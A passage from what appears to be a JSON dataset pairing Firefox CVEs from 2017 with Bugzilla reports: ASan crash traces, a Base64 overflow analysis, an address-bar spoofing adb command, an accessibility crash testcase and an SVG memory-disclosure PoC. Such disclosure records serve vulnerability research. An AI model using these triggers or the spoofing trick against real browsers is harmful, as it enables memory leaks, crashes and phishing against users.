/home/worker/workspace/build/src/layout/base/PresShell.cpp:4137 #15 0x7f5ea26da88e in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:598:5 #16 0x7f5ea26da88e in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7961 #17 0x7f5ea2722e9e in nsFocusManager::CheckIfFocusable(nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1550:3 #18 0x7f5ea271f53c in nsFocusManager::SetFocusInner(nsIContent*, int, bool, bool) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1180:41 #19 0x7f5ea27228de in nsFocusManager::SetFocus(nsIDOMElement*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:484:3 #20 0x7f5ea24afb8f in mozilla::dom::Element::Focus(mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/Element.cpp:311:14 #21 0x7f5ea3dbda38 in mozilla::dom::HTMLElementBinding::focus(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:462:3 #22 0x7f5ea4062047 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #23 0x7f5ea9b5491f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #24 0x7f5ea9b5491f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #25 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #26 0x7f5eaa7c6ddc in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #27 0x7f5eaa77d02e in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:351:14 #28 0x7f5eaa7a6899 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:12 #29 0x7f5eaa7a91c4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #30 0x7f5ea9b549c7 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #31 0x7f5ea9b549c7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #32 0x7f5ea9b3b996 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #33 0x7f5ea9b3b996 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2944 #34 0x7f5ea9b20a7b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #35 0x7f5ea9b54c36 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #36 0x7f5ea9b55312 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:2224:8 in nsFrameSelection::PhysicalMove(short, short, bool) Shadow bytes around the buggy address: 0x0c2280059480: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c2280059490: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c22800594a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c22800594b0: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c22800594c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c22800594d0: fd fd fd fd fd fd fd[fd]fd fd fd fd fd fa fa fa 0x0c22800594e0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c22800594f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2280059500: 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2280059510: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2280059520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==27885==ABORTING"
      }
    ],
    "CVE-2017-5461": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1344380",
        "title": "Write beyond bounds caused by bugs in Base64 de/encoding in nssb64d.c and nssb64e.c",
        "description": "PL_Base64MaxDecodedLength() (security\\nss\\lib\\util\\nssb64d.c) can cause an integer overflow. If it does, its caller(s) will allocate a buffer too small for the result of a Base64 decoding operation, then possibly overrun it. For example, PL_Base64DecodeBuffer() (security\\nss\\lib\\util\\nssb64d.c) uses the result of PL_Base64MaxDecodedLength() to check whether a caller-provided buffer is long enough, or to allocate a buffer if the caller does not provide one. In either case, the calculated length is inadequate if the length of the encoded string is >= 0x55555556. Once it has calculated the (potentially incorrect) length, it passes it and the corresponding buffer to pl_base64_decode_buffer() (same module) to do the decoding. That function incrementally checks against the provided length (data->output_buflen) but (another bug!) *only in debug builds (i.e. via a PR_ASSERT())*. The upshot is that PL_Base64DecodeBuffer() might be vulnerable to the same kind of buffer overrun bug as in https://bugzilla.mozilla.org/show_bug.cgi?id=1344081 : an attack that overruns a heap buffer, by an attacker-determined amount, with 3-byte granularity. There is a similar issue in PL_Base64MaxEncodedLength() and its associated functions for Base64 encoding. I will try to manifest these bugs and post a POC if and when I do. The bugs are in lines 373 and 254 (nssb64d.c): 370: static PRUint32 371: PL_Base64MaxDecodedLength (PRUint32 size) 372: { 373: return ((size * 3) / 4); 374: } 219: static PRStatus 220: pl_base64_decode_buffer (PLBase64Decoder *data, const unsigned char *in, 221: PRUint32 length) 222: { 223: unsigned char *out = data->output_buffer; 224: unsigned char *token = data->token; 225: int i, n = 0; 226: 227: i = data->token_size; 228: data->token_size = 0; 229: 230: while (length > 0) { 231: while (i < 4 && length > 0) { ... 254: PR_ASSERT((out - data->output_buffer + 3) <= data->output_buflen); and 288 and potentially 300 (nssb64e.c): 280: static PRUint32 281: PL_Base64MaxEncodedLength (PRUint32 size, PRUint32 line_length) 282: { 283: PRUint32 tokens, tokens_per_line, full_lines, line_break_chars, remainder; 284: 285: tokens = (size + 2) / 3; 286: 287: if (line_length == 0) 288: return tokens * 4; 289: 290: if (line_length < 4) /* too small! */ 291: line_length = 4; 292: 293: tokens_per_line = line_length / 4; 294: full_lines = tokens / tokens_per_line; 295: remainder = (tokens - (full_lines * tokens_per_line)) * 4; 296: line_break_chars = full_lines * 2; 297: if (remainder == 0) 298: line_break_chars -= 2; 299: 300: return (full_lines * tokens_per_line * 4) + line_break_chars + remainder; 301: }"
      }
    ],
    "CVE-2017-5463": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1338867",
        "title": "Fennec allows address bar spoofing in reader view with userinfo field in front of hostname of url",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8 Steps to reproduce: Connect ADB on your Android device that installed Firefox/Fennec and type following commands on the terminal. 1) adb shell 2) am start -a android.intent.action.VIEW -d about:reader?url=https://accounts.google.com%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20@blog.mozilla.org/security/2017/01/29/mozilla-security-bytes-episode-1-csp/ Actual results: Firefox/Fennec launches Mozilla security blog in reader view but the address bar shows \"https://accounts.google.com\". Expected results: Userinfo field in front of hostname, i.e., https://{userinfo}@hostname, should be stripped before showing it on the address bar."
      }
    ],
    "CVE-2017-5464": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1347075",
        "title": "negative size memmove in mozilla::a11y::Accessible::InsertChildAt",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170313233726). <script> function start() { fuzzPriv.enableAccessibility(); o2=document.createElement('iframe'); document.body.appendChild(o2); o51=document.body; o151=document.createElement('iframe'); o233=(new DOMParser()).parseFromString(\"<div><div>\",\"text/html\"); o236=o233.all[2]; o256=o233.all[3]; o256.appendChild(o51); document.replaceChild(o233.documentElement,document.documentElement); document.documentElement.appendChild(o151); o151.contentWindow.onresize=fun0; document.documentElement.replaceWith(o236,\"x\"); } function fun0 () { document.documentElement.appendChild(o256); o51.innerHTML=\"<marquee>><p><ul id='id56'>\"; document.documentElement.setAttribute('aria-owns','id56'); setTimeout(\"location.reload()\", 100); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==1262==ERROR: AddressSanitizer: negative-size-param: (size=-8) #0 0x49beeb in __asan_memmove /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425:3 #1 0x7f9e4c384d50 in MoveOverlappingRegion /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:620:5 #2 0x7f9e4c384d50 in ShiftData<nsTArrayInfallibleAllocator> /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:272 #3 0x7f9e4c384d50 in InsertElementAt<mozilla::a11y::Accessible *&, nsTArrayInfallibleAllocator> /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2064 #4 0x7f9e4c384d50 in mozilla::a11y::Accessible::InsertChildAt(unsigned int, mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/Accessible.cpp:2113 #5 0x7f9e4c3a6d42 in mozilla::a11y::DocAccessible::MoveChild(mozilla::a11y::Accessible*, mozilla::a11y::Accessible*, int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2239:3 #6 0x7f9e4c3a563b in mozilla::a11y::DocAccessible::PutChildrenBack(nsTArray<RefPtr<mozilla::a11y::Accessible> >*, unsigned int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2184:5 #7 0x7f9e4c3a50cc in mozilla::a11y::DocAccessible::ValidateARIAOwned() /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2027:7 #8 0x7f9e4c30d0ab in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:790:3 #9 0x7f9e49ba72e8 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1863:7 #10 0x7f9e49bb17fa in nsRefreshDriver::FinishedWaitingForTransaction() /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2159:5 #11 0x7f9e45305eb7 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:495:5 #12 0x7f9e453edc80 in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:588:7 #13 0x7f9e4472cfeb in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1547:20 #14 0x7f9e4406cdb0 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1795:14 #15 0x7f9e440692a9 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1730:17 #16 0x7f9e4406b924 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1603:5 #17 0x7f9e4406bf6e in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1636:5 #18 0x7f9e432661b2 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #19 0x7f9e43262a60 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #20 0x7f9e44074cbf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #21 0x7f9e43fe68c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #22 0x7f9e43fe68c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #23 0x7f9e43fe68c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #24 0x7f9e494d2bcf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #25 0x7f9e4cd13467 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:854:12 #26 0x7f9e43fe68c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #27 0x7f9e43fe68c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #28 0x7f9e43fe68c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #29 0x7f9e4cd12e69 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:686:7 #30 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #31 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #32 0x7f9e5e72082f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #33 0x41c3d8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c3d8) 0x6030002fc788 is located 24 bytes inside of 32-byte region [0x6030002fc770,0x6030002fc790) allocated by thread T0 (Web Content) here: #0 0x4b319e in realloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:71:3 #1 0x4e136d in moz_xrealloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:105:20 #2 0x7f9e4302fa16 in Realloc /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:211:12 #3 0x7f9e4302fa16 in nsTArrayInfallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayInfallibleAllocator>(unsigned long, unsigned long) /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:183 #4 0x7f9e4c384c5b in AppendElement<mozilla::a11y::Accessible *&, nsTArrayInfallibleAllocator> /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2116:32 #5 0x7f9e4c384c5b in mozilla::a11y::Accessible::InsertChildAt(unsigned int, mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/Accessible.cpp:2109 #6 0x7f9e4c3a6d42 in mozilla::a11y::DocAccessible::MoveChild(mozilla::a11y::Accessible*, mozilla::a11y::Accessible*, int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2239:3 #7 0x7f9e4c3a563b in mozilla::a11y::DocAccessible::PutChildrenBack(nsTArray<RefPtr<mozilla::a11y::Accessible> >*, unsigned int) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2184:5 #8 0x7f9e4c3a50cc in mozilla::a11y::DocAccessible::ValidateARIAOwned() /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2027:7 #9 0x7f9e4c30d0ab in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:790:3 #10 0x7f9e49ba72e8 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1863:7 #11 0x7f9e49bb17fa in nsRefreshDriver::FinishedWaitingForTransaction() /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2159:5 #12 0x7f9e45305eb7 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:495:5 #13 0x7f9e453edc80 in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /home/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:588:7 #14 0x7f9e4472cfeb in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1547:20 #15 0x7f9e4406cdb0 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1795:14 #16 0x7f9e440692a9 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1730:17 #17 0x7f9e4406b924 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1603:5 #18 0x7f9e4406bf6e in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1636:5 #19 0x7f9e432661b2 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #20 0x7f9e43262a60 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #21 0x7f9e44074cbf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #22 0x7f9e43fe68c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #23 0x7f9e43fe68c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #24 0x7f9e43fe68c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #25 0x7f9e494d2bcf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #26 0x7f9e4cd13467 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:854:12 #27 0x7f9e43fe68c8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #28 0x7f9e43fe68c8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #29 0x7f9e43fe68c8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #30 0x7f9e4cd12e69 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:686:7 #31 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #32 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #33 0x7f9e5e72082f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 SUMMARY: AddressSanitizer: negative-size-param /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425:3 in __asan_memmove ==1262==ABORTING"
      }
    ],
    "CVE-2017-5465": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1347617",
        "title": "Memory disclosure in ConvolvePixel",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 Steps to reproduce: There is an out of bound read leading to memory disclosure in Firefox. The vulnerability was confirmed on the nightly ASan build. Please note: This bug is subject to a 90 day disclosure deadline. If 90 days elapse without a broadly available patch, then the bug report will automatically become visible to the public. With any fix, please give credit for identifying the vulnerability to Ivan Fratric of Google Project Zero. PoC: ================================================================= <svg filter=\"url(#f)\"> <filter id=\"f\" filterRes=\"19\" filterUnits=\"userSpaceOnUse\"> <feConvolveMatrix kernelMatrix=\"1 1 1 1 1 1 1 1 1\" kernelUnitLength=\"1 -1\" /> ================================================================= Preliminary analysis: The problem seems to be the negative krenel unit length. This leads to an out-of-bound access in ConvolvePixel() and out-of-bounds data is going to be copied into the SVG image. From there, it can be extracted by an attacker by loading the SVG image into a canvas element. ASan log: ================================================================= ==25524==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f8cd2946336 at pc 0x7f8d3fcd397e bp 0x7ffc051ca390 sp 0x7ffc051ca388 READ of size 1 at 0x7f8cd2946336 thread T0 #0 0x7f8d3fcd397d in ColorComponentAtPoint /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2293:10 #1 0x7f8d3fcd397d in ConvolvePixel<int> /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2358 #2 0x7f8d3fcd397d in already_AddRefed<mozilla::gfx::DataSourceSurface> mozilla::gfx::FilterNodeConvolveMatrixSoftware::DoRender<int>(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, int, int) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2509 #3 0x7f8d3fcd089a in mozilla::gfx::FilterNodeConvolveMatrixSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:2379:12 #4 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #5 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #6 0x7f8d3fce4035 in mozilla::gfx::FilterNodeCropSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3140:10 #7 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #8 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #9 0x7f8d3fce4895 in mozilla::gfx::FilterNodeUnpremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3197:5 #10 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #11 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #12 0x7f8d3fcc7832 in mozilla::gfx::FilterNodeComponentTransferSoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:1781:5 #13 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #14 0x7f8d3fcb85d9 in mozilla::gfx::FilterNodeSoftware::GetInputDataSourceSurface(unsigned int, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::FilterNodeSoftware::FormatHint, mozilla::gfx::ConvolveMatrixEdgeMode, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:728:25 #15 0x7f8d3fce4685 in mozilla::gfx::FilterNodePremultiplySoftware::Render(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:3168:5 #16 0x7f8d3fcb0be2 in mozilla::gfx::FilterNodeSoftware::GetOutput(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:627:21 #17 0x7f8d3fc7cb43 in mozilla::gfx::FilterNodeSoftware::Draw(mozilla::gfx::DrawTarget*, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/2d/FilterNodeSoftware.cpp:580:14 #18 0x7f8d3fd8bc6e in mozilla::gfx::FilterSupport::RenderFilterDescription(mozilla::gfx::DrawTarget*, mozilla::gfx::FilterDescription const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SourceSurface*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, nsTArray<RefPtr<mozilla::gfx::SourceSurface> >&, mozilla::gfx::PointTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/src/FilterSupport.cpp:1360:8 #19 0x7f8d44ccc3fd in nsFilterInstance::Render(mozilla::gfx::DrawTarget*) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:545:3 #20 0x7f8d44ccb7ee in nsFilterInstance::PaintFilteredFrame(nsIFrame*, mozilla::gfx::DrawTarget*, gfxMatrix const&, nsSVGFilterPaintCallback*, nsRegion const*) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:81:19 #21 0x7f8d44d09f72 in nsSVGIntegrationUtils::PaintFilter(nsSVGIntegrationUtils::PaintFramesParams const&) /home/worker/workspace/build/src/layout/svg/nsSVGIntegrationUtils.cpp:1094:5 #22 0x7f8d44f7e9bd in PaintAsLayer /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:8330:30 #23 0x7f8d44f7e9bd in PaintInactiveLayer /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:3722 #24 0x7f8d44f7e9bd in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, gfxContext*, nsRenderingContext*, nsDisplayListBuilder*, nsPresContext*, mozilla::gfx::IntPointTyped<mozilla::gfx::UnknownUnits> const&, float, float, int) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6044 #25 0x7f8d44f819f2 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer*, gfxContext*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, 